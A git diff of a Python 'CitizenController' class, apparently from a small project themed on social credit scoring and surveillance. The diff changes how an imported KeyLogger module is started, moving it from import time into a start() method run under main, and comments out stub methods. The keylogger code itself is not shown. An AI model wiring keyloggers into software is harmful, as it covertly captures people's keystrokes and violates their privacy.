@@ -1,8 +1,7 @@
 from dataClasses.dataClasses import Citizen
+from modules.keylogger.keylogger import KeyLogger
 
-from modules.keylogger.keylogger import main
-
-main()
+from queryController import QueryController
 
 class CitizenController:
     def __init__(self, citizen, id, blackList, failings) -> None:
@@ -11,7 +10,12 @@ class CitizenController:
         self.blackList = blackList
         self.failings = failings
 
-    def getSocialCreditScore():
+    def start(self):
+        QUERY_CONTROLLER = QueryController()
+        KEYLOGGER = KeyLogger(QUERY_CONTROLLER, ["awd"], ["jwt jwt"])
+        KEYLOGGER.main()
+
+    """ def getSocialCreditScore():
         return 0
 
     def sendData():
@@ -36,6 +40,8 @@ class CitizenController:
         pass
 
     def getBlackList(self):
-        return self.blackList
+        return self.blackList """
 
-
+if __name__ == "__main__":
+    CITIZEN_CONTROLLER = CitizenController(None, 0, None, None)
+    CITIZEN_CONTROLLER.start()
